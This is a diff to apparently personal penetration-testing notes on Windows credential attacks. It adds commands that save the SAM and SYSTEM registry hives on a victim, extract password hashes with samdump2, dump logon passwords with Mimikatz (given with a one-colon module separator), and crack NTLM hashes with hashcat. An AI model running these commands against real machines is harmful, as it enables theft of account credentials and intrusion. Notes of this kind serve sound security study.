@@ -171,14 +171,27 @@ Responsible for _authentication, password management, active directory, security
 - "Pass-the-Hash" attack
 - Dumping password hashes
 
+__Dumping using registry__
+_Victim_
+```powershell
+reg save hklm\system system
+reg save hklm\sam sam
+```
+_Attacker_
+```bash
+samdump2 sys sam
+```
+
 __samdump2 tool__
 - This tool is designed to dump Windows password hashes from a SAM file, _using the syskey bootkey from the system hive_.
 - Recovers the syskey bootkey from a Windows system hive.
 - __Syskey__ is a Windows feature that _adds an additional encryption layer to the password hashes_ stored in the SAM database.
 
-```bash
-samdump2 sys sam
+__Mimikatz__
+```powershell
+sekurlsa:logonpasswords
 ```
+
 ```hash
 hashcat -m 1000 -a 0 hashes.txt $wordlist -O
 ```
